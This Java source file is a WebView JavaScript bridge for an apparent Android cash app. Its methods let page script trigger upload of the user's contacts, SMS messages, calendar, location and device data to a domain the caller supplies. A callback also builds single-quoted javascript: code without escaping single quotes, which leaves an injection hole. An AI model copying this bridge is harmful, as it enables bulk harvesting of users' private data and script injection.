package com.cashhub.cash.app;

import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.webkit.JavascriptInterface;

import android.webkit.WebView;
import android.widget.Toast;
import com.alibaba.fastjson.JSONObject;
import com.cashhub.cash.common.UploadData;
import com.tencent.sonic.sdk.SonicDiffDataCallback;


/**
 * Sonic javaScript Interface (Android API Level >= 17)
 */

public class SonicJavaScriptInterface {
  private static final String TAG = "JavaScriptMethods";

  private Context mContext;
  private WebView mWebView;

  private final SonicSessionClientImpl mSessionClient;

  private final Intent mIntent;

  public static final String PARAM_CLICK_TIME = "clickTime";

  public static final String PARAM_LOAD_URL_TIME = "loadUrlTime";

  private UploadData mUploadData;

  public SonicJavaScriptInterface(Context context, WebView webView,
      SonicSessionClientImpl sessionClient,
      Intent intent) {
    this.mContext = context;
    this.mWebView = webView;
    this.mSessionClient = sessionClient;
    this.mIntent = intent;
  }

  @JavascriptInterface
  public void getAndSendDevice(JSONObject systemInfo, String token, String domain,
    long timeStamp, String deviceKey) {
    new Thread(() -> {
        try {
            //初始化数据
            if (this.mUploadData == null) {
                this.mUploadData = new UploadData(mContext);
            }

            this.mUploadData.getAndSendDevice(systemInfo, token, domain, timeStamp, deviceKey);
        } catch (Exception e) {
            Log.d(TAG, e.getMessage());
        }
    }).start();//启动线程
  }

  /**
   * 手机上报通讯录
   * @param systemInfo
   * @param token
   * @param domain
   * @param timeStamp
   * @param deviceKey
   */
  @JavascriptInterface
  public void getAndSendContact(JSONObject systemInfo, String token, String domain,
    long timeStamp, String deviceKey) {
    new Thread(() -> {
        try {
            //初始化数据
            if (this.mUploadData == null) {
              this.mUploadData = new UploadData(mContext);
            }

            this.mUploadData.getAndSendContact(systemInfo, token, domain, timeStamp, deviceKey);
        } catch (Exception e) {
            Log.d(TAG, e.getMessage());
        }
    }).start();//启动线程
  }

  /**
   * 手机上报短信信息
   * @param systemInfo
   * @param token
   * @param domain
   * @param timeStamp
   * @param deviceKey
   */
  @JavascriptInterface
  public void getAndSendSms(JSONObject systemInfo, String token, String domain,
    long timeStamp, String deviceKey) {
    new Thread(() -> {
        try {
            //初始化数据
            if (this.mUploadData == null) {
              this.mUploadData = new UploadData(mContext);
            }

            this.mUploadData.getAndSendSms(systemInfo, token, domain, timeStamp, deviceKey);
        } catch (Exception e) {
            Log.d(TAG, e.getMessage());
        }
    }).start();//启动线程
  }

  /**
   * 手机上报日历
   * @param systemInfo
   * @param token
   * @param domain
   * @param timeStamp
   * @param deviceKey
   */
  @JavascriptInterface
  public void getAndSendCalendar(JSONObject systemInfo, String token, String domain,
    long timeStamp, String deviceKey) {
    new Thread(() -> {
        try {
            //初始化数据
            if (this.mUploadData == null) {
              this.mUploadData = new UploadData(mContext);
            }

            this.mUploadData.getAndSendCalendar(systemInfo, token, domain, timeStamp, deviceKey);
        } catch (Exception e) {
            Log.d(TAG, e.getMessage());
        }
    }).start();//启动线程
  }

  /**
   * 手机上报定位
   * @param systemInfo
   * @param token
   * @param domain
   * @param timeStamp
   * @param deviceKey
   */
  @JavascriptInterface
  public void getAndSendMap(JSONObject systemInfo, String token, String domain,
    long timeStamp, String deviceKey) {
    new Thread(() -> {
        try {
            //初始化数据
            if (this.mUploadData == null) {
              this.mUploadData = new UploadData(mContext);
            }

            this.mUploadData.getAndSendLocation(systemInfo, token, domain, timeStamp, deviceKey);
        } catch (Exception e) {
            Log.d(TAG, e.getMessage());
        }
    }).start();//启动线程
  }

  /**
   * 手机上报定位
   * @param systemInfo
   * @param token
   * @param domain
   * @param timeStamp
   * @param deviceKey
   */
  @JavascriptInterface
  public void getAndSendLocation(JSONObject systemInfo, String token, String domain,
      long timeStamp, String deviceKey) {
      new Thread(() -> {
          try {
              //初始化数据
              if (this.mUploadData == null) {
                this.mUploadData = new UploadData(mContext);
              }
              this.mUploadData.getAndSendLocation2(systemInfo, token, domain, timeStamp,
                  deviceKey);
          } catch (Exception e) {
              Log.d(TAG, e.getMessage());
          }
      }).start();//启动线程
  }

  @JavascriptInterface
  public void getDiffData() {
    // the callback function of demo page is hardcode as 'getDiffDataCallback'
    getDiffData2("getDiffDataCallback");
  }

  @JavascriptInterface
  public void getDiffData2(final String jsCallbackFunc) {
    if (null != mSessionClient) {
      mSessionClient.getDiffData(new SonicDiffDataCallback() {
        @Override
        public void callback(final String resultData) {
          Runnable callbackRunnable = new Runnable() {
            @Override
            public void run() {
              String jsCode = "javascript:" + jsCallbackFunc + "('"+ toJsString(resultData) + "')";
              mSessionClient.getWebView().loadUrl(jsCode);
            }
          };
          if (Looper.getMainLooper() == Looper.myLooper()) {
            callbackRunnable.run();
          } else {
            new Handler(Looper.getMainLooper()).post(callbackRunnable);
          }
        }
      });
    }
  }

  @JavascriptInterface
  public String getPerformance() {
    long clickTime = mIntent.getLongExtra(PARAM_CLICK_TIME, -1);
    long loadUrlTime = mIntent.getLongExtra(PARAM_LOAD_URL_TIME, -1);
    try {
      JSONObject result = new JSONObject();
      result.put(PARAM_CLICK_TIME, clickTime);
      result.put(PARAM_LOAD_URL_TIME, loadUrlTime);
      return result.toString();
    } catch (Exception e) {

    }

    return "";
  }

  /*
   * * From RFC 4627, "All Unicode characters may be placed within the quotation marks except
   * for the characters that must be escaped: quotation mark,
   * reverse solidus, and the control characters (U+0000 through U+001F)."
   */
  private static String toJsString(String value) {
    if (value == null) {
      return "null";
    }
    StringBuilder out = new StringBuilder(1024);
    for (int i = 0, length = value.length(); i < length; i++) {
      char c = value.charAt(i);


      switch (c) {
        case '"':
        case '\\':
        case '/':
          out.append('\\').append(c);
          break;

        case '\t':
          out.append("\\t");
          break;

        case '\b':
          out.append("\\b");
          break;

        case '\n':
          out.append("\\n");
          break;

        case '\r':
          out.append("\\r");
          break;

        case '\f':
          out.append("\\f");
          break;

        default:
          if (c <= 0x1F) {
            out.append(String.format("\\u%04x", (int) c));
          } else {
            out.append(c);
          }
          break;
      }

    }
    return out.toString();
  }
}

